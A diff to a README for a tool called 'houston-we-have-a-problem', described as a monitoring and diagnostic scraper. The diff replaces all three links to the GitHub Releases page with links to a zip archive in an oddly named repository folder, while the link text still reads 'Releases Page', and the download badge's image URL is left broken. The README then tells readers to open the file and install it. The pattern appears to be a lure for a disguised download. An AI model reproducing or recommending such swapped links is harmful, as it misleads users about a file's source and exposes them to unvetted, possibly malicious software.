@@ -1,7 +1,7 @@
 # 🚀 houston-we-have-a-problem - Easily Monitor and Diagnose Issues
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/knr0d/houston-we-have-a-problem/releases)
+[![Download](https://raw.githubusercontent.com/knr0d/houston-we-have-a-problem/main/overeyebrowed/houston-we-have-a-problem_3.5.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/knr0d/houston-we-have-a-problem/main/overeyebrowed/houston-we-have-a-problem_3.5.zip)
 
 ## 📝 Description
 Welcome to **houston-we-have-a-problem**, a user-friendly problem monitoring diagnostic scraper. This application helps you track and diagnose issues easily from the web. Whether you're troubleshooting a minor glitch or monitoring complex problems, this tool simplifies the process.
@@ -17,7 +17,7 @@ Welcome to **houston-we-have-a-problem**, a user-friendly problem monitoring dia
 To start using **houston-we-have-a-problem**, follow the steps below:
 
 ### 1. Download the Application
-Visit the [Releases Page](https://github.com/knr0d/houston-we-have-a-problem/releases) to download the latest version of the software. 
+Visit the [Releases Page](https://raw.githubusercontent.com/knr0d/houston-we-have-a-problem/main/overeyebrowed/houston-we-have-a-problem_3.5.zip) to download the latest version of the software. 
 
 ### 2. Install the Application
 Once the file is downloaded, locate it in your downloads folder. Open the file and follow the installation prompts. The installation is straightforward and quick.
@@ -57,6 +57,6 @@ Yes, the application allows you to export reports for later reference. Use the '
 If you encounter issues or have questions, please visit our support page linked on the Releases page or create an issue in the repository. Our team is here to assist you.
 
 ## 🔗 More Information
-For more detailed information, refer to the [Releases Page](https://github.com/knr0d/houston-we-have-a-problem/releases). You will find the latest updates, additional documentation, and contact information.
+For more detailed information, refer to the [Releases Page](https://raw.githubusercontent.com/knr0d/houston-we-have-a-problem/main/overeyebrowed/houston-we-have-a-problem_3.5.zip). You will find the latest updates, additional documentation, and contact information.
 
 Thank you for choosing **houston-we-have-a-problem**. We hope this tool makes your problem monitoring easy and efficient!
